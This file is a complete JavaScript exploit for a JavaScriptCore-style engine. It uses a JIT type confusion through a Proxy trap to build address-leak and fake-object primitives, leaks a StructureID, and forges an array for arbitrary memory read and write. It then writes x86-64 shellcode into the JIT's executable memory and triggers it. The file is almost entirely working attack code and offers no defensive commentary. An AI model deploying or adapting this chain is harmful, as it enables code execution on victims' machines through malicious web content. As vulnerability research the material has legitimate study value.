const MAX_ITERATIONS = 0xc0000;//4800;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    // let tmp = Array.from(u32);
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    return i2f(val-0x02000000000000);
}

// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function MakeJitCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

function arg()
{
    return arguments;
}

let argNoArray = arg(1);

let p = new Proxy({}, {
    has: function() {
        victim[0] = {};
    }
})

let argSlowArray = arg(2);
argSlowArray.__proto__ = p;
argSlowArray[0] = 1.1;
argSlowArray[1] = 1.1;

// print(describe(argSlowArray));
// readline();
let globalArr = [{}, 1.1];
globalArr[0] = argNoArray;
globalArr[1] = argSlowArray;

objStorageArray = {};
objStorageArray[0] = 1.1;
objStorageArray[0x1000] = 2.2;


objSlowArray = {};
objSlowArray[0] = 1.1;
objSlowArray.__proto__ = p;
// print(describe(objSlowArray));
// readline();
// let victim = [1.1, 2.2];


function AddrOfFoo(flag, idx, victim)
{
    let tmp = globalArr[0];
    tmp[0];  // Array::Type is Array::DirectArguments, arrayMode will be (ArrayStorageShape, NonArray);

    let tmp1;
    if(flag) {
        tmp1 = tmp;
    }
    else {
        tmp1 = objSlowArray;
        (11111)[11111111];
    }

    let tmp2 = tmp1;
    if(!flag) {
        tmp2 = objStorageArray;
    }


    victim[1] = 1.1;
    idx in tmp2;
    
    let val = victim[0];
    // return tmp1[0]; 
    return [tmp1[0], val];
}

function FakeObjFoo(flag, idx, victim, val)
{
    let tmp = globalArr[0];
    tmp[0];  // Array::Type is Array::DirectArguments, arrayMode will be (ArrayStorageShape, NonArray);

    let tmp1;
    if(flag) {
        tmp1 = tmp;
    }
    else {
        tmp1 = objSlowArray;
        (11111)[11111111];
    }

    let tmp2 = tmp1;
    if(!flag) {
        tmp2 = objStorageArray;
    }


    victim[1] = 1.1;
    idx in tmp2;
    
    victim[0] = val;
    // return tmp1[0]; 
    return tmp1[0];
}

// allocate obj with no copy on write property.
let noCoW = 13.37;

let templateObj = new Array(noCoW, 2.2, 3.3);
templateObj.x = 1.1;
// print(describe(templateObj));

templateObj.y = 2.2;
delete templateObj.y;  // destroy the structure watchpoint
// print(describe(templateObj));

// allocate again
templateObj = new Array(noCoW, 2.2, 3.3);
templateObj.x = 1.1;
// print(describe(templateObj));
// readline();

for(let i=0; i<MAX_ITERATIONS; i++) {
    AddrOfFoo(false, i, templateObj);
}

for(let i=0; i<MAX_ITERATIONS; i++) {
    FakeObjFoo(false, i, templateObj, 1.1);
}

globalArr[0] = argSlowArray;
// globalArr[0] = argSlowArray;
// ret = opt(true, 0x10000, victim);
// print(ret[1]);
function AddrOf(obj)
{
    let victim = new Array(noCoW, 2.2, 3.3);
    victim.x = 1.1;
    // print(describe(victim1));
    let p = new Proxy({}, {
        has: function() {
            victim[0] = obj;
        }
    })

    argSlowArray.__proto__ = p;

    let ret = AddrOfFoo(true, 0x10000, victim);
    return f2i(ret[1]);
}

function FakeObj(addr)
{

	addr = i2f(addr);
    let victim = new Array(noCoW, 2.2, 3.3);
    victim.x = 1.1;
    // print(describe(victim1));
    let p = new Proxy({}, {
        has: function() {
            victim[0] = {};
        }
    })

    argSlowArray.__proto__ = p;

    FakeObjFoo(true, 0x10000, victim, addr);
    return victim[0];
}

/*
// AddrOf and FakeObj primitives tests
let obj = [1.1, 2.2, 3.3];
print(describe(obj));
let objAddr = AddrOf(obj);
print(hex(objAddr));
let fakeObj = FakeObj(objAddr);
print(describe(fakeObj));
readline();
*/

// leak entropy by functionProtoFuncToString
function LeakStructureID(obj)
{
    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf

    var unlinkedFunctionExecutable = {
        m_isBuitinFunction: i2f(0xdeadbeef),
        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
        m_identifier: {},
    };

    var fakeFunctionExecutable = {
      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
      m_executable: unlinkedFunctionExecutable,
    };

    var container = {
      jscell: i2f(0x00001a0000000000),
      butterfly: {},
      pad: 0,
      m_functionExecutable: fakeFunctionExecutable,
    };


    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);

    unlinkedFunctionExecutable.m_identifier = fakeObj;
    container.butterfly = arrLeak;

    var nameStr = Function.prototype.toString.call(fakeObj);

    let structureID = nameStr.charCodeAt(9);

    // repair the fakeObj's jscell
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    container.jscell = f64[0];
    return structureID;
}

// leak entropy by getByVal
function LeakStructureID2(obj)
{
    let container = {
        cellHeader: i2obj(0x0108230700000000),
        butterfly: obj
    };

    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);
    f64[0] = fakeObj[0];

    // print(123); 
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];

    return structureID;
}

let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 3.3);
var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
// print(describe(pad));
// print(describe(arrLeak)); 
let structureID = LeakStructureID2(arrLeak);
// let structureID = LeakStructureID(arrLeak);
print("[+] leak structureID: "+hex(structureID));

pad = [{}, {}, {}];
var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_0'] = 13.37;

u32[0] = structureID;
u32[1] = 0x01082309-0x20000;
// container to store fake driver object
var container = {
    cellHeader: f64[0],
    butterfly: victim   
};
// build fake driver
var containerAddr = AddrOf(container);
var fakeArrAddr = containerAddr + 0x10;
print("[+] fake driver object addr: "+hex(fakeArrAddr));
var driver = FakeObj(fakeArrAddr);

// ArrayWithDouble
var unboxed = [noCoW, 13.37, 13.37];
// ArrayWithContiguous
var boxed = [{}];

// leak unboxed butterfly's addr
driver[1] = unboxed;
var sharedButterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(sharedButterfly)));
// now the boxed array and unboxed array share the same butterfly
driver[1] = boxed;
victim[1] = sharedButterfly;
// print(describe(boxed));
// print(describe(unboxed));


// set driver's cell header to double array
u32[0] = structureID;
u32[1] = 0x01082307-0x20000;
container.cellHeader = f64[0];

function NewAddrOf(obj) {
    boxed[0] = obj;
    return f2i(unboxed[0]);
}

function NewFakeObj(addr) {
    unboxed[0] = i2f(addr);
    return boxed[0];            
}

function Read64(addr) {
    driver[1] = i2f(addr+0x10);
    return NewAddrOf(victim.prop);
    // return f2i(victim.prop);
}

function Write64(addr, val) {
    driver[1] = i2f(addr+0x10);
	victim.prop = NewFakeObj(val);
    // victim.prop = i2f(val);
}

function ByteToDwordArray(payload)
{

    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length/6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for(let j=0; j<6; j++){
            let c = payload[i*6+j]
            if(c === undefined) {
                c = 0;
            }
            pow = j==0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

function ArbitraryWrite(addr, payload) 
{
    let sc = ByteToDwordArray(payload);
    for(let i=0; i<sc.length; i++) {
        Write64(addr+i*6, sc[i]);
    }
}

// get jit jit function first;
let jitFunc = MakeJitCompiledFunction();
jitFunc = MakeJitCompiledFunction();
// get the addr with addr_of primitive;
let jitFuncAddr = NewAddrOf(jitFunc);
// get the executable base addr;
let executableBaseAddr = Read64(jitFuncAddr + 0x18);
// get the jit code object addr;
let jitCodeAddr = Read64(executableBaseAddr + 0x8);
// finally get the rwx addr;
let  rwxAddr = Read64(jitCodeAddr + 0x20);

print("[+] jit function addr: "+hex(jitFuncAddr));
print("[+] executable base addr: "+hex(executableBaseAddr));
print("[+] jit code addr: "+hex(jitCodeAddr));
print("[+] rwx addr: "+hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// write shellcode to rwx mem
ArbitraryWrite(rwxAddr, shellcode);

// trigger shellcode to execute
jitFunc();
/*
*/

